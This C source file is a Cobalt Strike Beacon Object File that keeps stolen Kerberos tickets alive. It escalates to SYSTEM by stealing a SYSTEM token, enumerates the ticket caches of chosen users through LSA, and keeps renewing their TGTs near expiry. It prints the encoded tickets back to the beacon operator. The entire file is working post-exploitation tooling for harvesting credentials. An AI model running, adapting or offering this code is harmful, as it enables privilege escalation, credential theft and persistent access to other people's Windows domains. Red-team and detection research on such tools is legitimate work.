#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "common.h"
#include "common.c"

BOOL IsExpired(PTICKET_ENTRY ticket) {
    LARGE_INTEGER now = { 0 };
    NTDLL$NtQuerySystemTime(&now);
    return now.QuadPart >= ticket->renewTime.QuadPart;
}

BOOL Expires(PTICKET_ENTRY ticket, int minutes) {
    LARGE_INTEGER now = { 0 };
    NTDLL$NtQuerySystemTime(&now);
    LONGLONG marginTicks = (LONGLONG)minutes * 60 * 10000000LL;
    return (ticket->endTime.QuadPart - now.QuadPart) <= marginTicks;
}

VOID RenewTicket(HANDLE hLsa, ULONG authPackage, PTICKET_ENTRY ticket) {
    NTSTATUS status = STATUS_SUCCESS;
    NTSTATUS protocolStatus = STATUS_SUCCESS;

    WCHAR wspn[256] = { 0 };
    toWideChar(ticket->spn, wspn, sizeof(wspn));
    UNICODE_STRING target = {
        .Buffer = wspn,
        .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
        .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
    };

    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* response = NULL;
    ULONG requestSize  = sizeof(KERB_RETRIEVE_TKT_REQUEST) + target.MaximumLength;
    ULONG responseSize = 0;

    request = (KERB_RETRIEVE_TKT_REQUEST*)MemAlloc(requestSize);
    if (!request)
        return;

    request->MessageType              = KerbRetrieveEncodedTicketMessage;
    request->LogonId                  = ticket->luid;
    request->CacheOptions             = KERB_RETRIEVE_TICKET_DONT_USE_CACHE | KERB_RETRIEVE_TICKET_CACHE_TICKET;
    request->TicketFlags              = 0;
    request->EncryptionType           = 0;
    request->TargetName.Length        = target.Length;
    request->TargetName.MaximumLength = target.MaximumLength;
    request->TargetName.Buffer        = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(request->TargetName.Buffer, wspn, target.MaximumLength);

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
    MemFree(request);

    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] RenewTicket failed: status=0x%08lx protocolStatus=0x%08lx\n", status, protocolStatus);
        if (response)
            SECUR32$LsaFreeReturnBuffer(response);
        return;
    }

    if (responseSize > 0 && response) {
        ticket->startTime      = response->Ticket.StartTime;
        ticket->endTime        = response->Ticket.EndTime;
        ticket->renewTime      = response->Ticket.RenewUntil;
        ticket->ticketFlags    = response->Ticket.TicketFlags;
        ticket->encryptionType = response->Ticket.SessionKey.KeyType;

        PrintTicketInformation(ticket, "Renewed TGT");
        if (response->Ticket.EncodedTicket && response->Ticket.EncodedTicketSize > 0)
            PrintTicket(response->Ticket.EncodedTicket, response->Ticket.EncodedTicketSize);

        SECUR32$LsaFreeReturnBuffer(response);
   
    } else {
        if (response)
            SECUR32$LsaFreeReturnBuffer(response);

        PBYTE encodedTicket = NULL;
        ULONG ticketSize    = 0;
        PrintTicketInformation(ticket, "Renewed TGT");
        if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, ticket->luid, target, &encodedTicket, &ticketSize)) && encodedTicket && ticketSize) {
            PrintTicket(encodedTicket, ticketSize);
            MemFree(encodedTicket);
        }
    }
    BeaconWakeup();
}

VOID go(char* args, int argc) {
    datap parser = { 0 };
    HANDLE hStop = BeaconGetStopJobEvent();

    BeaconDataParse(&parser, args, argc);
    int interval = BeaconDataInt(&parser);
    char* targetUsers = BeaconDataExtract(&parser, NULL);
    int threshold = BeaconDataInt(&parser);

    if (!IsSystem()) {
        HANDLE hToken = StealSystemToken();
        if (!hToken) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
            return;
        }
        ADVAPI32$SetThreadToken(NULL, hToken);
        KERNEL32$CloseHandle(hToken);
    }

    HANDLE hLsa = 0;
    if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
        return;

    ULONG authPackage = 0;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting automatic TGT renewal (interval: %ds) (threshold: %dmin)\n", interval, threshold);
    if (targetUsers && targetUsers[0] != '\0')
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users: %s\n", targetUsers);
    BeaconWakeup();

    do {
        TICKET_CACHE curr = { 0 };

        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUsers, &curr))) {
            for (int i = 0; i < curr.count; i++) {
                PTICKET_ENTRY ticket = &curr.tickets[i];

                if (IsExpired(ticket))
                    continue;

                if (Expires(ticket, threshold)) {
                    LARGE_INTEGER now = { 0 };
                    NTDLL$NtQuerySystemTime(&now);
                    LONGLONG lifetime = (ticket->endTime.QuadPart - now.QuadPart) / 600000000LL;
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Remaining ticket lifetime below threshold (%lld/%dmin)\n", lifetime, threshold);
                    RenewTicket(hLsa, authPackage, ticket);
                }
            }
        }

        if (curr.tickets)
            MemFree(curr.tickets);

        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
        if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
            break;

    } while (TRUE);

    SECUR32$LsaDeregisterLogonProcess(hLsa);

    ADVAPI32$RevertToSelf();

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
}
